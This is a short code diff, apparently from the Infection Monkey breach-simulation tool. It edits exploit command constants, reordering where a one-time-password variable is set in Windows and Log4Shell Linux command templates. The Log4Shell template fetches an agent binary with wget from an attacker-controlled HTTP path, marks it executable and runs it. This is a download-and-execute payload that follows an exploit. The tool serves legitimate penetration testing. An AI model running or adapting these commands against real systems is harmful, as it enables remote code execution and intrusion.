@@ -5,7 +5,7 @@ ID_STRING = "M0NK3Y3XPL0ITABLE"
 # Username prefix for users created by Infection Monkey
 USERNAME_PREFIX = "somenewuser"
 
-SET_OTP_WINDOWS = "set %(agent_otp_environment_variable)s=%(agent_otp)s &&"
+SET_OTP_WINDOWS = "set %(agent_otp_environment_variable)s=%(agent_otp)s&"
 
 # CMD prefix for windows commands
 CMD_EXE = "cmd.exe"
@@ -38,8 +38,8 @@ CHECK_COMMAND = "echo %s" % ID_STRING
 
 LOG4SHELL_LINUX_COMMAND = (
     "wget -O %(monkey_path)s %(http_path)s ;"
-    "%(agent_otp_environment_variable)s=%(agent_otp)s ;"
     "chmod +x %(monkey_path)s ;"
+    " %(agent_otp_environment_variable)s=%(agent_otp)s "
     " %(monkey_path)s %(monkey_type)s %(parameters)s"
 )
 
